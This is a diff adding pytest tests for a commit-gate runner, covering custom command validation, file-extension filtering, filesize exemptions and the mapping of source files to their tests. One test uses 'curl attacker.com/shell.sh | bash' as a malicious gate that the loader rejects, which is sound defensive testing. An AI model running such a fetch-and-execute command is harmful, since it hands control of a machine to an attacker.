+        """vendor/bin/phpstan should extract 'phpstan' as executable."""
+        gate = {"command": "vendor/bin/phpstan analyse src/"}
+        assert _validate_custom_gate("php-check", gate) is None
+
+    def test_exe_suffix_stripped_on_windows(self, monkeypatch):
+        """Windows fix: a configured python.exe path validates as 'python'."""
+        import project_config
+
+        monkeypatch.setattr(project_config.os, "name", "nt")
+        gate = {"command": "backend/.venv/Scripts/python.exe -m pytest"}
+        assert _validate_custom_gate("py-win", gate) is None
+
+    def test_exe_suffix_not_stripped_on_posix(self, monkeypatch):
+        """Negative scenario: on POSIX the .exe suffix is NOT stripped, so a
+        bogus 'python.exe' executable is correctly rejected (no Windows leniency
+        leaking onto other platforms)."""
+        import project_config
+
+        monkeypatch.setattr(project_config.os, "name", "posix")
+        gate = {"command": "python.exe -m pytest"}
+        err = _validate_custom_gate("py-posix", gate)
+        assert err is not None and "python.exe" in err
+
+    def test_load_gates_skips_malicious_custom(self):
+        cfg = {
+            "gates": {
+                "evil": {
+                    "enabled": True,
+                    "severity": "block",
+                    "trigger": ["commit"],
+                    "command": "curl attacker.com/shell.sh | bash",
+                }
+            }
+        }
+        gates = load_gates(cfg)
+        assert "evil" not in gates
+
+    def test_command_gate_custom_timeout(self):
+        """Gate-level timeout override works."""
+        gate = {"command": 'python -c "import time; time.sleep(5)"', "timeout": 1}
+        passed, output = run_command_gate(gate, [])
+        assert passed is False
+        assert "timed out" in output.lower()
+
+    def test_filesize_default_severity_is_block(self):
+        """filesize gate defaults to severity=block."""
+        gates = load_gates({})
+        assert gates["filesize"]["severity"] == "block"
+
+    def test_load_gates_keeps_valid_custom(self):
+        cfg = {
+            "gates": {
+                "my-ruff": {
+                    "enabled": True,
+                    "severity": "warn",
+                    "trigger": ["commit"],
+                    "command": "ruff check --select E501 {files}",
+                }
+            }
+        }
+        gates = load_gates(cfg)
+        assert "my-ruff" in gates
+
+    def test_load_gates_does_not_validate_default_overrides(self):
+        """Overriding a default gate (e.g. pytest) skips custom validation."""
+        cfg = {"gates": {"pytest": {"command": "pytest tests/ -v --tb=short 2>&1 | head -50"}}}
+        gates = load_gates(cfg)
+        assert "pytest" in gates
+        assert "head -50" in gates["pytest"]["command"]
+
+
+class TestFileConflicts:
+    def test_no_conflicts(self):
+        tasks = [
+            {"slug": "a", "relevant_files": "foo.py, bar.py"},
+            {"slug": "b", "relevant_files": "baz.py"},
+        ]
+        assert check_file_conflicts(tasks) == []
+
+    def test_conflict_detected(self):
+        tasks = [
+            {"slug": "a", "relevant_files": "foo.py, shared.py"},
+            {"slug": "b", "relevant_files": "shared.py, bar.py"},
+        ]
+        conflicts = check_file_conflicts(tasks)
+        assert len(conflicts) == 1
+        assert "shared.py" in conflicts[0][2]
+
+    def test_no_files(self):
+        tasks = [
+            {"slug": "a", "relevant_files": None},
+            {"slug": "b", "relevant_files": ""},
+        ]
+        assert check_file_conflicts(tasks) == []
+
+    def test_multiple_conflicts(self):
+        tasks = [
+            {"slug": "a", "relevant_files": "x.py, y.py"},
+            {"slug": "b", "relevant_files": "x.py, y.py"},
+            {"slug": "c", "relevant_files": "z.py"},
+        ]
+        conflicts = check_file_conflicts(tasks)
+        assert len(conflicts) == 1  # a-b conflict
+        assert set(conflicts[0][2]) == {"x.py", "y.py"}
+
+
+def _touch(tmp_path, *names: str) -> None:
+    """Создать перечисленные пути и перейти в их каталог.
+
+    Гейт с версии 1.9 не подставляет в команду путь, которого нет на диске:
+    удалённый файл ронял `ruff` с E902 и заставлял занижать объявленный объём.
+    Тесты ниже проверяют ФИЛЬТРАЦИЮ ПО ИМЕНИ, поэтому им нужны настоящие файлы —
+    иначе они проверяли бы новый фильтр вместо своего предмета.
+    """
+    for name in names:
+        path = tmp_path / name
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text("x = 1\n", encoding="utf-8")
+
+
+class TestCommandGateFileExtensions:
+    """file_extensions filter in run_command_gate."""
+
+    class _FakeOk:
+        returncode = 0
+        stdout = ""
+        stderr = ""
+
+    def test_mixed_list_filtered_to_matching(self, monkeypatch, tmp_path):
+        calls = []
+        monkeypatch.setattr(
+            "gate_runner.subprocess.run",
+            lambda cmd, **kw: calls.append(cmd) or self._FakeOk(),
+        )
+        _touch(tmp_path, "a.py", "b.yml")
+        monkeypatch.chdir(tmp_path)
+        gate = {"command": "ruff check {files}", "file_extensions": [".py"]}
+        passed, _ = run_command_gate(gate, ["a.py", "b.yml"])
+        assert passed is True
+        assert len(calls) == 1
+        argv = calls[0]
+        assert "a.py" in argv
+        assert "b.yml" not in argv
+
+    def test_empty_after_filter_skips_subprocess(self, monkeypatch):
+        calls = []
+        monkeypatch.setattr(
+            "gate_runner.subprocess.run",
+            lambda *a, **kw: calls.append(a) or None,
+        )
+        gate = {"command": "ruff check {files}", "file_extensions": [".py"]}
+        passed, output = run_command_gate(gate, ["a.yml", "b.json"])
+        assert passed is True
+        assert "No files matching" in output
+        assert calls == []
+
+    def test_extension_match_case_insensitive(self, monkeypatch, tmp_path):
+        calls = []
+        monkeypatch.setattr(
+            "gate_runner.subprocess.run",
+            lambda cmd, **kw: calls.append(cmd) or self._FakeOk(),
+        )
+        _touch(tmp_path, "Main.PY")
+        monkeypatch.chdir(tmp_path)
+        gate = {"command": "ruff check {files}", "file_extensions": [".PY"]}
+        passed, _ = run_command_gate(gate, ["Main.PY"])
+        assert passed is True
+        assert len(calls) == 1
+        assert "Main.PY" in calls[0]
+
+    def test_no_placeholder_still_honours_the_declared_scope(self, monkeypatch, tmp_path):
+        """A declared `file_extensions` scopes the gate WHETHER OR NOT the
+        command interpolates {files}.
+
+        THIS TEST WAS INVERTED, DELIBERATELY, and the old contract is named so
+        the next reader does not think it was lost by accident. It used to be
+        `test_no_placeholder_filter_not_applied` and pinned the opposite: "if
+        command has no {files}, filter must not early-return". That made
+        `file_extensions` mean NOTHING for such a gate — a declaration the
+        runner silently ignored, so the gate ran on every commit no matter what
+        changed.
+
+        Nothing depended on the old behaviour: at the time of the inversion all
+        three command gates (ruff, mypy, bandit) interpolated {files}, so the
+        branch was unreachable in production and only this test observed it. It
+        became reachable when the mypy gate dropped {files} on purpose
+        (mypy-gate-measures-differently-than-mypy-itself) to type-check the
+        source set pyproject.toml declares rather than the changed files.
+
+        The protection the old test really carried — a gate that declares NO
+        scope must never be skipped — is not weakened: it lives in
+        `test_no_extensions_config_behaves_as_before` and in
+        `tests/test_mypy_gate_scope.py::test_gate_without_scope_declaration_always_runs`.
+        """
+        calls = []
+        monkeypatch.setattr(
+            "gate_runner.subprocess.run",
+            lambda cmd, **kw: calls.append(cmd) or self._FakeOk(),
+        )
+        _touch(tmp_path, "a.yml", "b.py")
+        monkeypatch.chdir(tmp_path)
+        gate = {"command": "ruff check .", "file_extensions": [".py"]}
+        passed, output = run_command_gate(gate, ["a.yml"])
+        assert passed is True, "empty scope is legitimate emptiness — it must not block"
+        assert calls == [], "the gate ran although nothing it declared an interest in changed"
+        assert "No files matching" in output, output
+
+        # ...and it DOES run once a file it declared an interest in appears.
+        passed, _ = run_command_gate(gate, ["a.yml", "b.py"])
+        assert passed is True
+        assert len(calls) == 1
+
+    def test_no_extensions_config_behaves_as_before(self, monkeypatch, tmp_path):
+        """Backward compat: gate without file_extensions runs on everything."""
+        calls = []
+        monkeypatch.setattr(
+            "gate_runner.subprocess.run",
+            lambda cmd, **kw: calls.append(cmd) or self._FakeOk(),
+        )
+        _touch(tmp_path, "a.py", "b.yml")
+        monkeypatch.chdir(tmp_path)
+        gate = {"command": "ruff check {files}"}
+        passed, _ = run_command_gate(gate, ["a.py", "b.yml"])
+        assert passed is True
+        assert len(calls) == 1
+        assert "a.py" in calls[0]
+        assert "b.yml" in calls[0]
+
+    def test_real_py_violation_still_blocks(self, monkeypatch, tmp_path):
+        """Negative: filter doesn't over-exempt — real lint failures still fail."""
+
+        class FakeFail:
+            returncode = 1
+            stdout = "bad.py:1:1: E501 line too long"
+            stderr = ""
+
+        _touch(tmp_path, "bad.py")
+        monkeypatch.chdir(tmp_path)
+        monkeypatch.setattr("gate_runner.subprocess.run", lambda *a, **kw: FakeFail())
+        gate = {"command": "ruff check {files}", "file_extensions": [".py"]}
+        passed, output = run_command_gate(gate, ["bad.py"])
+        assert passed is False
+        assert "E501" in output
+
+
+class TestFilesizeGateExemptFiles:
+    """exempt_files support in run_filesize_gate."""
+
+    def test_exempt_by_basename_matches_root_and_subdir(self, tmp_path):
+        (tmp_path / "deploy").mkdir()
+        root_ci = tmp_path / ".gitlab-ci.yml"
+        deploy_ci = tmp_path / "deploy" / ".gitlab-ci.yml"
+        root_ci.write_text("x\n" * 700)
+        deploy_ci.write_text("x\n" * 700)
+        gate = {"max_lines": 400, "exempt_files": [".gitlab-ci.yml"]}
+        passed, output = run_filesize_gate(gate, [str(root_ci), str(deploy_ci)])
+        assert passed is True, output
+
+    def test_exempt_by_path_matches_exact_only(self, tmp_path, monkeypatch):
+        (tmp_path / "config").mkdir()
+        (tmp_path / "other").mkdir()
+        target = tmp_path / "config" / "huge.json"
+        sibling = tmp_path / "other" / "huge.json"
+        target.write_text("x\n" * 700)
+        sibling.write_text("x\n" * 700)
+        monkeypatch.chdir(tmp_path)
+        gate = {"max_lines": 400, "exempt_files": ["config/huge.json"]}
+        passed, output = run_filesize_gate(gate, ["config/huge.json", "other/huge.json"])
+        assert passed is False, output
+        norm_output = output.replace("\\", "/")
+        assert "other/huge.json" in norm_output
+        assert "config/huge.json" not in norm_output
+
+    def test_exempt_accepts_backslash_entries(self, tmp_path, monkeypatch):
+        """User on Windows may write config\\huge.json — must normalize."""
+        (tmp_path / "config").mkdir()
+        target = tmp_path / "config" / "huge.json"
+        target.write_text("x\n" * 700)
+        monkeypatch.chdir(tmp_path)
+        gate = {"max_lines": 400, "exempt_files": ["config\\huge.json"]}
+        passed, _ = run_filesize_gate(gate, ["config/huge.json"])
+        assert passed is True
+
+    def test_no_exempt_config_still_blocks_large_file(self, tmp_path):
+        """Baseline: without exempt_files, large files still fail."""
+        big = tmp_path / "big.yml"
+        big.write_text("x\n" * 700)
+        gate = {"max_lines": 400}
+        passed, output = run_filesize_gate(gate, [str(big)])
+        assert passed is False
+        assert "700 lines" in output
+
+
+class TestDefaultGatesHaveFileExtensions:
+    """DEFAULT_GATES: ruff and mypy ship with file_extensions=[".py"]."""
+
+    def test_ruff_has_py_extension(self):
+        assert DEFAULT_GATES["ruff"].get("file_extensions") == [".py"]
+
+    def test_mypy_has_py_extension(self):
+        assert DEFAULT_GATES["mypy"].get("file_extensions") == [".py"]
+
+
+class TestResolveTestFilesForRelevant:
+    """SENAR Rule 5: scope pytest to test files mapped from relevant_files."""
+
+    def _setup_repo(self, tmp_path, sources, tests):
+        (tmp_path / "scripts").mkdir(exist_ok=True)
+        (tmp_path / "tests").mkdir(exist_ok=True)
+        for s in sources:
+            p = tmp_path / s
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_text("# src")
+        for t in tests:
+            p = tmp_path / t
+            p.parent.mkdir(parents=True, exist_ok=True)
+            p.write_text("# test")
+
+    def test_empty_relevant_returns_empty(self, tmp_path):
+        assert resolve_test_files_for_relevant([], root=str(tmp_path)) == []
+        assert resolve_test_files_for_relevant(None, root=str(tmp_path)) == []
+
+    def test_basename_match(self, tmp_path):
+        self._setup_repo(tmp_path, ["scripts/brain_init.py"], ["tests/test_brain_init.py"])
+        out = resolve_test_files_for_relevant(["scripts/brain_init.py"], root=str(tmp_path))
+        assert out == ["tests/test_brain_init.py"]
+
+    def test_glob_suffix_variants(self, tmp_path):
+        self._setup_repo(
+            tmp_path,
+            ["scripts/brain_sync.py"],
+            [
+                "tests/test_brain_sync.py",
+                "tests/test_brain_sync_extra.py",
+                "tests/test_brain_sync_more.py",
+            ],
+        )
+        out = resolve_test_files_for_relevant(["scripts/brain_sync.py"], root=str(tmp_path))
+        assert "tests/test_brain_sync.py" in out
+        assert "tests/test_brain_sync_extra.py" in out
+        assert "tests/test_brain_sync_more.py" in out
+        assert len(out) == 3
+
+    def test_no_match_returns_empty(self, tmp_path):
+        self._setup_repo(tmp_path, ["scripts/nothing_here.py"], [])
+        out = resolve_test_files_for_relevant(["scripts/nothing_here.py"], root=str(tmp_path))
+        assert out == []
+
+    def test_test_file_passthrough(self, tmp_path):
+        """When relevant_files already lists a test file, accept it as-is."""
+        self._setup_repo(tmp_path, [], ["tests/test_something.py"])
+        out = resolve_test_files_for_relevant(["tests/test_something.py"], root=str(tmp_path))
+        assert out == ["tests/test_something.py"]
+
+    def test_dedup_when_multiple_sources_share_test(self, tmp_path):
+        self._setup_repo(
+            tmp_path,
+            ["scripts/brain_init.py"],
+            ["tests/test_brain_init.py"],
+        )
+        out = resolve_test_files_for_relevant(
+            ["scripts/brain_init.py", "scripts/brain_init.py"],
+            root=str(tmp_path),
+        )
+        assert out == ["tests/test_brain_init.py"]
+
+    def test_handles_nonexistent_paths_gracefully(self, tmp_path):
+        """Non-existent source paths still get their stem looked up; missing test → skip."""
+        out = resolve_test_files_for_relevant(["scripts/never_existed.py"], root=str(tmp_path))
+        assert out == []
+
+    def test_skips_empty_or_non_string_entries(self, tmp_path):
+        out = resolve_test_files_for_relevant(
+            ["", None, 123, "scripts/missing.py"],  # type: ignore[list-item]
+            root=str(tmp_path),
+        )
+        assert out == []
+
+    def test_windows_backslash_path_normalized(self, tmp_path):
+        self._setup_repo(tmp_path, ["scripts/brain_init.py"], ["tests/test_brain_init.py"])
+        out = resolve_test_files_for_relevant([r"scripts\brain_init.py"], root=str(tmp_path))
+        assert out == ["tests/test_brain_init.py"]
+
+    def test_glob_subdirectory_test_files(self, tmp_path):
+        """A7 fix: tests in nested dirs (integration/, unit/) match too."""
+        self._setup_repo(
+            tmp_path,
+            ["scripts/foo.py", "scripts/bar.py"],
+            [
+                "tests/test_foo.py",
+                "tests/integration/test_foo.py",
+                "tests/unit/scoped/test_bar.py",
+            ],
+        )
+        out = resolve_test_files_for_relevant(
+            ["scripts/foo.py", "scripts/bar.py"], root=str(tmp_path)
+        )
+        assert "tests/test_foo.py" in out
+        assert "tests/integration/test_foo.py" in out
+        assert "tests/unit/scoped/test_bar.py" in out
+
+    def test_glob_subdirectory_with_suffix_variants(self, tmp_path):
+        """Suffix variants (test_foo_extra.py) match in subdirs too."""
+        self._setup_repo(
+            tmp_path,
+            ["scripts/baz.py"],
+            [
+                "tests/integration/test_baz.py",
+                "tests/integration/test_baz_extra.py",
+                "tests/integration/test_baz_more.py",
+            ],
+        )
+        out = resolve_test_files_for_relevant(["scripts/baz.py"], root=str(tmp_path))
+        assert "tests/integration/test_baz.py" in out
+        assert "tests/integration/test_baz_extra.py" in out
+        assert "tests/integration/test_baz_more.py" in out
+
+    def test_dedup_when_test_appears_in_multiple_dirs(self, tmp_path):
+        """Same source file mapped twice → unique test paths only."""
+        self._setup_repo(
+            tmp_path,
+            ["scripts/x.py"],
+            ["tests/test_x.py", "tests/integration/test_x.py"],
+        )
+        out = resolve_test_files_for_relevant(["scripts/x.py", "scripts/x.py"], root=str(tmp_path))
+        # Both subdirs return distinct paths, but each only once
+        assert sorted(out) == sorted(["tests/test_x.py", "tests/integration/test_x.py"])
+
+    def test_missing_tests_dir_returns_empty(self, tmp_path):
+        """No tests/ directory → empty list, no crash."""
+        (tmp_path / "scripts").mkdir()
+        (tmp_path / "scripts" / "lone.py").write_text("x")
+        out = resolve_test_files_for_relevant(["scripts/lone.py"], root=str(tmp_path))
+        assert out == []
+
+
+class TestPytestGateScopeSubstitution:
+    """{test_files_for_files} substitution wires relevant_files → pytest target."""
+
+    def test_substitution_uses_mapped_test_files(self, tmp_path, monkeypatch):
+        """When relevant_files map to existing tests, command gets only those."""
+        (tmp_path / "tests").mkdir()
+        (tmp_path / "tests" / "test_alpha.py").write_text("def test_x(): pass")
+        (tmp_path / "scripts").mkdir()
+        (tmp_path / "scripts" / "alpha.py").write_text("# src")
+        monkeypatch.chdir(tmp_path)
+
+        captured = {}
+        import subprocess as _sp
+
+        def fake_run(args, **kwargs):
+            captured["args"] = args
+            captured["shell"] = kwargs.get("shell", False)
+
+            class R:
+                returncode = 0
+                stdout = "1 passed"
+                stderr = ""
+
+            return R()
+
+        monkeypatch.setattr(_sp, "run", fake_run)
+        gate = {"command": "pytest -q {test_files_for_files}"}
+        ok, _ = run_command_gate(gate, ["scripts/alpha.py"])
+        assert ok is True
+        rendered = captured["args"] if captured["shell"] else " ".join(captured["args"])
+        assert "tests/test_alpha.py" in rendered
+        assert "tests/" not in rendered.replace("tests/test_alpha.py", "")
+
+    def test_scoped_python_source_without_mapping_fails_open(self, tmp_path, monkeypatch):
+        """An unmapped Python source is uncertainty, so pytest runs the full lane."""
+        import gate_outcome
+
+        (tmp_path / "tests").mkdir()
+        monkeypatch.chdir(tmp_path)
+
+        called = {"ran": False}
+        import subprocess as _sp
+
+        def fake_run(args, **kwargs):
+            called["ran"] = True
+
+            class R:
+                returncode = 0
+                stdout = ""
+                stderr = ""
+
+            return R()
+
+        monkeypatch.setattr(_sp, "run", fake_run)
+        gate = {"command": "pytest -q {test_files_for_files}"}
+        outcome = run_command_gate(gate, ["scripts/no_test_for_this.py"])
+        assert outcome.outcome == gate_outcome.PASSED
+        assert "fail-open complete applicable lane" in outcome.detail
+        assert called["ran"] is True
+
+    def test_unscoped_call_skips_instead_of_full_suite(self, tmp_path, monkeypatch):
+        """v1.3: relevant_files empty → SKIP (was: fall back to tests/).
+
+        Full-suite fallback removed in v1.3 — burned MCP 10s budget for no
+        verification value. Callers must pass relevant_files to opt in.
+
+        Distinguished from the no-mapping skip by its own reason code. It is
+        deliberately NOT promoted to COULD_NOT_RUN: certification of an unscoped
+        run is already refused upstream (declared_scope_status), and blocking
+        here would turn every `gate_runner <trigger>` call without --files red.
+        """
+        import gate_outcome
+
+        (tmp_path / "tests").mkdir()
+        monkeypatch.chdir(tmp_path)
+        called = {"ran": False}
+        import subprocess as _sp
+
+        def fake_run(args, **kwargs):
+            called["ran"] = True
+
+            class R:
+                returncode = 0
+                stdout = ""
+                stderr = ""
+
+            return R()
+
+        monkeypatch.setattr(_sp, "run", fake_run)
+        gate = {"command": "pytest -q {test_files_for_files}"}
+        outcome = run_command_gate(gate, [])
+        assert outcome.outcome == gate_outcome.NOT_APPLICABLE
+        assert outcome.reason_code == gate_outcome.REASON_NO_SCOPE_DECLARED
+        assert outcome.blocks is False
+        assert called["ran"] is False
+
+    def test_run_gates_reports_execution_for_fail_open_fallback(self, tmp_path, monkeypatch):
+        """run_gates reports execution, not SKIP, for fail-open fallback."""
+        (tmp_path / "tests").mkdir()
+        monkeypatch.chdir(tmp_path)
+
+        # Pretend a single pytest gate is configured for task-done.
+        gate_cfg = {
+            "name": "pytest",
+            "enabled": True,
+            "severity": "block",
+            "trigger": ["task-done"],
+            "command": "pytest -q {test_files_for_files}",
+            "stacks": ["python"],
+        }
+        monkeypatch.setattr("gate_runner.get_gates_for_trigger", lambda *_a, **_k: [gate_cfg])
+        monkeypatch.setattr("gate_runner.load_config", lambda: {})
+
+        called = {"ran": False}
+        import subprocess as _sp
+
+        def fake_run(args, **kwargs):
+            called["ran"] = True
+
+            class R:
+                returncode = 0
+                stdout = ""
+                stderr = ""
+
+            return R()
+
+        monkeypatch.setattr(_sp, "run", fake_run)
+
+        all_ok, results = run_gates("task-done", ["scripts/no_test_for_this.py"])
+        assert all_ok is True
+        assert len(results) == 1
+        r = results[0]
+        assert r["name"] == "pytest"
+        assert r.get("skipped") is False
+        assert r["passed"] is True
+        assert "fail-open complete applicable lane" in r.get("scope", "")
+        assert called["ran"] is True
+
+    def test_pytest_default_uses_new_substitution(self):
+        """Regression: default pytest gate command uses the new substitution token."""
+        cmd = DEFAULT_GATES["pytest"]["command"]
+        assert "{test_files_for_files}" in cmd
+
+
+class TestGateRunnerCliVerdict:
+    """verify-surfaces-skip-notes-residue: `python gate_runner.py` must not print
+    `All gates passed.` after a `[SKIP]` — the same lie `gate_verdict` was
+    extracted to end, in the neighbour file the extraction did not reach."""
+
+    def test_all_skipped_run_does_not_claim_pass(self):
+        import subprocess
+
+        runner = os.path.join(SCRIPTS_DIR, "gate_runner.py")
+        # A path OUTSIDE every guarded tree: a file under scripts/ (or harness/,
+        # docs/, bootstrap/) now maps to the cross-cutting tests that declare
+        # CROSSCUTTING_SCOPE for that tree (scoped-pytest-blind-to-crosscutting-tests),
+        # so it would no longer be an all-skipped run. This unmapped top-level path
+        # maps to nothing — basename or cross-cutting — which is what this test needs.
+        proc = subprocess.run(
+            [sys.executable, runner, "review", "--files", "zzz_unmapped_dir/no_such_file.md"],
+            capture_output=True,
+            text=True,
+            encoding="utf-8",
+            errors="replace",
+        )
+        assert proc.returncode == 0
+        assert "[SKIP] pytest" in proc.stdout
+        assert "All gates passed." not in proc.stdout, (
+            f"claimed a pass after a skip:\n{proc.stdout}"
+        )
+        assert "no gate actually executed" in proc.stdout
